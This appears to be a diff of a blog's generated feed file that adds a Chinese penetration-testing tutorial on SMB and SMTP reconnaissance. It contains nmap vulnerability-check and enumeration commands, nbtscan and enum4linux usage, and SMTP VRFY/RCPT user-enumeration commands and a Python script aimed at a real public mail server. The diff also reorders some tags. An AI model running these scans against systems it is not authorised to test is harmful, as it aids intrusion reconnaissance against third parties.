+        <content type="html"><![CDATA[<h4 id="Server-Message-Block-协议"><a href="#Server-Message-Block-协议" class="headerlink" title="Server Message Block 协议"></a><strong>Server Message Block 协议</strong></h4><p>微软历史上出现安全问题最多的协议<br>    实现复杂<br>    默认开放<br>    文件共享<br>    空会话未身份人证访问(SMB1)<br>        密码策略<br>        用户名<br>        组名<br>        机器名<br>        用户,组SID</p><blockquote><h4 id="SMB扫描"><a href="#SMB扫描" class="headerlink" title="SMB扫描"></a><strong>SMB扫描</strong></h4></blockquote><h5 id="nmap–SMB扫描"><a href="#nmap–SMB扫描" class="headerlink" title="nmap–SMB扫描"></a><strong>nmap</strong>–SMB扫描</h5><pre><code>nmap -v -p139,445 192.168.254.0/24nmap 192.168.254.102 -p139,445 --script=smb-os-discovery.nse #判断系统信息nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 192.168.254.102 #探测漏洞信息ls /usr/share/nmap/scripts/  #nmap脚本放置路径</code></pre><h5 id="nbtscan–SMB扫描"><a href="#nbtscan–SMB扫描" class="headerlink" title="nbtscan–SMB扫描"></a><strong>nbtscan</strong>–SMB扫描</h5><pre><code>nbtscan -r 192.168.254.0/24</code></pre><h5 id="enum4linux–SMB扫描"><a href="#enum4linux–SMB扫描" class="headerlink" title="enum4linux–SMB扫描"></a><strong>enum4linux</strong>–SMB扫描</h5><pre><code>enum4linux -a 192.168.254.102</code></pre><blockquote><h4 id="SMTP扫描"><a href="#SMTP扫描" class="headerlink" title="SMTP扫描"></a><strong>SMTP扫描</strong></h4></blockquote><h5 id="nc–SMTP扫描"><a href="#nc–SMTP扫描" class="headerlink" title="nc–SMTP扫描"></a><strong>nc</strong>–SMTP扫描</h5><pre><code>nc -nc 1.1.1.1 25HELO 163.com    VRFY root</code></pre><h5 id="nmap–SMTP扫描"><a href="#nmap–SMTP扫描" class="headerlink" title="nmap–SMTP扫描"></a><strong>nmap</strong>–SMTP扫描</h5><pre><code>nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}nmap smtp.163.com -p25 --script=smtp-open-relay.nse</code></pre><h5 id="smtp-user-enum–SMTP扫描"><a href="#smtp-user-enum–SMTP扫描" class="headerlink" title="smtp-user-enum–SMTP扫描"></a><strong>smtp-user-enum</strong>–SMTP扫描</h5><pre><code>smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1</code></pre><h5 id="python-smtp-scan-py"><a href="#python-smtp-scan-py" class="headerlink" title="python ./smtp_scan.py"></a><strong>python</strong> <code>./smtp_scan.py</code></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage: smtp_scan.py &lt;username&gt;"</span></span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">'smtp.163.com'</span>,<span class="number">25</span>))</span><br><span class="line">banner=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> banner+<span class="string">'aaaaa'</span></span><br><span class="line">s.send(<span class="string">'RCPT'</span>+sys.argv[<span class="number">1</span>]+<span class="string">'\r\n'</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 信息收集 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> SMB扫描 </tag>
+            
+            <tag> nmap </tag>
+            
+            <tag> SMTP扫描 </tag>
+            
+            <tag> nc </tag>
+            
+            <tag> nbtscan </tag>
+            
+            <tag> enum4linux </tag>
             
         </tags>
       
@@ -1488,11 +1558,11 @@
       
         <tags>
             
-            <tag> nmap </tag>
-            
             <tag> python </tag>
             
             <tag> Scapy </tag>
+            
+            <tag> nmap </tag>
             
             <tag> SNMP </tag>
             
@@ -1525,11 +1595,11 @@
       
         <tags>
             
-            <tag> nc </tag>
+            <tag> python </tag>
             
             <tag> nmap </tag>
             
-            <tag> python </tag>
+            <tag> nc </tag>
             
             <tag> amap </tag>
             
@@ -1562,13 +1632,13 @@
       
         <tags>
             
-            <tag> nc </tag>
-            
-            <tag> nmap </tag>
-            
             <tag> python </tag>
             
             <tag> Scapy </tag>
+            
+            <tag> nmap </tag>
+            
+            <tag> nc </tag>
             
             <tag> hping3 </tag>
             
@@ -1601,15 +1671,15 @@
       
         <tags>
             
-            <tag> nmap </tag>
+            <tag> TCP </tag>
             
             <tag> python </tag>
             
             <tag> Scapy </tag>
             
-            <tag> hping3 </tag>
+            <tag> nmap </tag>
             
-            <tag> TCP </tag>
+            <tag> hping3 </tag>
             
             <tag> UDP </tag>
             
@@ -1669,11 +1739,11 @@
       
         <tags>
             
+            <tag> python </tag>
+            
             <tag> 主动信息收集 </tag>
             
             <tag> 扫描开发 </tag>
-            
-            <tag> python </tag>
             
         </tags>
       
